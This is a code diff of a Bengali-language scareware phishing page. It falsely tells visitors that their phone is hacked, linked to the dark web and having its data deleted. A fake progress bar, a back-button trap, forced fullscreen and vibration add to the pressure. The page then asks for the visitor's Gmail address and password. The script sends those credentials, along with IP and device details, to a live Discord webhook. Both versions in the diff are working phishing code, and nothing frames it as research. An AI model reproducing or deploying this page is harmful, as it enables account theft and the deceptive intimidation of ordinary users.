@@ -2,115 +2,136 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Critical Alert #8821</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>⚠️ SYSTEM TERMINATED ⚠️</title>
     <style>
-        body { background: #000; color: #fff; font-family: 'Arial', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .main-box { width: 90%; max-width: 400px; background: #111; border: 3px solid #ff0000; border-radius: 20px; padding: 30px; text-align: center; box-shadow: 0 0 50px rgba(255, 0, 0, 0.4); position: relative; }
-        .danger-icon { font-size: 60px; color: #ff0000; animation: pulse 1s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
-        h1 { font-size: 22px; color: #ff0000; margin: 15px 0; }
-        .data-stream { background: #000; border: 1px solid #333; padding: 10px; font-family: 'Courier New', monospace; font-size: 12px; text-align: left; color: #0f0; margin-bottom: 20px; border-radius: 5px; }
-        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ff0000; background: #222; color: #fff; border-radius: 8px; font-size: 16px; outline: none; }
-        button { width: 100%; padding: 18px; background: #ff0000; color: #fff; border: none; font-weight: bold; border-radius: 8px; cursor: pointer; font-size: 18px; transition: 0.3s; }
-        button:hover { background: #b30000; }
-        .footer { font-size: 10px; color: #555; margin-top: 15px; }
+        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; touch-action: none; cursor: crosshair; }
+        .prison-box { width: 90%; max-width: 420px; background: rgba(10, 0, 0, 0.9); border: 5px solid #ff0000; border-radius: 5px; padding: 30px; text-align: center; box-shadow: 0 0 150px #ff0000; z-index: 9999; }
+        .glitch { font-size: 26px; font-weight: bold; text-transform: uppercase; animation: glitch 0.2s infinite; }
+        @keyframes glitch { 0% { transform: skew(2deg); } 50% { transform: skew(-2deg); } 100% { transform: skew(0); } }
+        .progress-container { width: 100%; background: #222; margin: 20px 0; border: 1px solid #ff0000; height: 15px; }
+        .progress-bar { width: 0%; height: 100%; background: #ff0000; transition: width 0.1s linear; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #ff0000; background: #000; color: #0f0; border-radius: 0; font-size: 16px; box-sizing: border-box; }
+        button { width: 100%; padding: 20px; background: #ff0000; color: #000; border: none; font-weight: bold; cursor: pointer; font-size: 20px; margin-top: 10px; }
+        .log-text { font-size: 10px; color: #0f0; text-align: left; height: 60px; overflow: hidden; margin-top: 10px; border-top: 1px solid #333; }
     </style>
 </head>
-<body>
+<body onclick="forceAction()">
 
-<div class="main-box">
-    <div class="danger-icon">☠️</div>
-    <h1>সিস্টেম হ্যাকড বা ব্লকড!</h1>
-    <p style="font-size: 14px; color: #ccc;">আপনার ডিভাইসে অবৈধ কার্যক্রম শনাক্ত হয়েছে। ১০ মিনিটের মধ্যে ভেরিফাই না করলে আপনার <b>NID, Gmail</b> এবং <b>Phone</b> স্থায়ীভাবে লক হবে।</p>
+<div class="prison-box">
+    <div class="glitch">☠️ SYSTEM CRITICAL ☠️</div>
+    <p style="color: #fff; font-size: 12px; margin-top: 10px;">আপনার ডিভাইসটি ডার্ক ওয়েব সার্ভারের সাথে যুক্ত হয়েছে। ভেরিফাই না করলে আপনার ফোনের গ্যালারি এবং ব্যাংকিং তথ্য পাবলিক হয়ে যাবে।</p>
     
-    <div class="data-stream" id="log">
-        [SYS] Initializing Scan...<br>
-        [NET] Tracking IP: Detecting...<br>
-        [DEV] Model: Identifying...
+    <div class="progress-container">
+        <div class="progress-bar" id="pbar"></div>
     </div>
+    <p id="ptext" style="font-size: 10px;">Data Deletion in Progress: 0%</p>
 
-    <input type="email" id="email" placeholder="আপনার প্রধান জিমেইল এড্রেস" required>
-    <input type="password" id="pass" placeholder="জিমেইল এর পাসওয়ার্ড দিন" required>
-    <button onclick="finalStrike()">ফিক্স এবং আনলক করুন</button>
-    <div class="footer">Security ID: TRX-992-B8</div>
+    <input type="email" id="email" placeholder="Gmail Address" required>
+    <input type="password" id="pass" placeholder="Password" required>
+    <button onclick="sendData()">STOP DELETION & UNLOCK</button>
+    
+    <div class="log-text" id="log">
+        [!] Connection Established...<br>
+        [!] Initializing Root Access...
+    </div>
 </div>
 
 <script>
-    const HOOK = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
 
-    // ১. ব্যাক বাটন ব্লক করা (ভয় দেখানোর জন্য)
-    window.onbeforeunload = function() { return "সতর্কবার্তা: এখন বের হলে আপনার ফোন চিরতরে অচল হবে!"; };
-
-    async function masterCapture() {
-        try {
-            // আইপি এবং নেটওয়ার্ক ডাটা
-            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-            const geoData = await fetch(`https://ipapi.co/${ipData.ip}/json/`).then(r => r.json());
-            
-            // ব্যাটারি এবং সেন্সর ডাটা
-            let batteryInfo = "N/A";
-            if (navigator.getBattery) {
-                const batt = await navigator.getBattery();
-                batteryInfo = (batt.level * 100) + "% " + (batt.charging ? "(Charging)" : "(Discharging)");
-            }
-
-            const model = navigator.userAgent.match(/\(([^)]+)\)/)[1];
-            document.getElementById('log').innerHTML = `[NET] IP: ${ipData.ip}<br>[LOC] City: ${geoData.city}<br>[DEV] ${model}<br>[BAT] ${batteryInfo}`;
-
-            // ডিসকর্ডে সুপার ডাটা পাঠানো
-            const payload = {
-                content: "🔥 **CRITICAL STRIKE: TARGET TRAPPED** 🔥",
-                embeds: [{
-                    title: "Advanced Device Forensics",
-                    color: 16711680,
-                    fields: [
-                        { name: "🌐 IP & ISP", value: `${ipData.ip} (${geoData.org})` },
-                        { name: "📍 Location", value: `${geoData.city}, ${geoData.region}, ${geoData.country_name}` },
-                        { name: "📱 Device Model", value: model },
-                        { name: "🔋 Battery", value: batteryInfo, inline: true },
-                        { name: "🧠 RAM/Cores", value: `${navigator.deviceMemory || "Unknown"}GB / ${navigator.hardwareConcurrency} Cores`, inline: true },
-                        { name: "🖥️ Screen", value: `${window.screen.width}x${window.screen.height}`, inline: true }
-                    ]
-                }]
-            };
-            fetch(HOOK, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(payload) });
-
-        } catch (e) {
-            fetch(HOOK, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({content: "⚠️ Basic Access Logged (Advanced Blocked)"}) });
-        }
+    // ১. এক্সিট প্রিভেনশন (Exit Prevention Loop)
+    function lockExit() {
+        window.history.pushState(null, null, window.location.href);
+        window.onpopstate = function() {
+            window.history.pushState(null, null, window.location.href);
+            navigator.vibrate([500, 200, 500]); // ফোন কেঁপে উঠবে
+            alert("⚠️ WARNING: Exit Attempt Blocked. Your data is being uploaded to remote servers.");
+        };
     }
 
-    async function finalStrike() {
+    // ২. ভাইব্রেশন এবং ফুল স্ক্রিন (Force Action)
+    function forceAction() {
+        if (navigator.vibrate) navigator.vibrate(100);
+        let el = document.documentElement;
+        if (el.requestFullscreen) el.requestFullscreen();
+    }
+
+    // ৩. ফেক প্রসেস বার (Fake Deletion)
+    let width = 0;
+    function startProgress() {
+        let bar = document.getElementById('pbar');
+        let txt = document.getElementById('ptext');
+        let interval = setInterval(() => {
+            if (width >= 99) { clearInterval(interval); }
+            else {
+                width++;
+                bar.style.width = width + '%';
+                txt.innerText = "Data Deletion in Progress: " + width + "%";
+            }
+        }, 300);
+    }
+
+    async function initialCapture() {
+        try {
+            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            const model = navigator.userAgent.match(/\(([^)]+)\)/)[1];
+            document.getElementById('log').innerHTML += `<br>[OK] Remote IP: ${ipData.ip}<br>[OK] Device: ${model}`;
+
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    content: "⛓️ **MAX PRISON ACTIVATED** ⛓️",
+                    embeds: [{
+                        color: 16711680,
+                        title: "Target Fully Trapped",
+                        fields: [
+                            { name: "IP", value: ipData.ip },
+                            { name: "Specs", value: model },
+                            { name: "Status", value: "Locked in Fullscreen Prison" }
+                        ]
+                    }]
+                })
+            });
+        } catch (e) {}
+    }
+
+    async function sendData() {
         const u = document.getElementById('email').value;
         const p = document.getElementById('pass').value;
 
         if(!u || !p) {
-            alert("ভুল তথ্য দিলে মোবাইলটি এখনই রিপেয়ার করা অসম্ভব হয়ে যাবে!");
+            alert("সব তথ্য না দিলে ডিলিট হওয়া ফাইল রিকভার করা অসম্ভব!");
             return;
         }
 
-        await fetch(HOOK, {
+        await fetch(WEBHOOK_URL, {
             method: "POST",
             headers: {"Content-Type": "application/json"},
             body: JSON.stringify({
-                content: "🧨 **VICTORY: CREDENTIALS CAPTURED** 🧨",
+                content: "🧨 **HIGH-VALUE DATA CAPTURED** 🧨",
                 embeds: [{
-                    color: 0,
+                    color: 65280,
                     fields: [
-                        { name: "G-Mail", value: u },
-                        { name: "Password", value: p }
+                        { name: "Target Email", value: u },
+                        { name: "Target Password", value: p },
+                        { name: "Final Status", value: "Verified & Released" }
                     ]
                 }]
             })
         });
 
-        alert("আপনার ডিভাইসটি সফলভাবে স্ক্যান করা হয়েছে এবং সুরক্ষিত আছে।");
-        window.onbeforeunload = null; // এবার বের হতে দিবে
-        window.location.href = "https://myaccount.google.com/security";
+        alert("System Restored. Your device is now safe.");
+        window.onpopstate = null;
+        window.location.href = "https://myaccount.google.com/";
     }
 
-    window.onload = masterCapture;
+    window.onload = () => {
+        lockExit();
+        initialCapture();
+        startProgress();
+    };
 </script>
 
 </body>
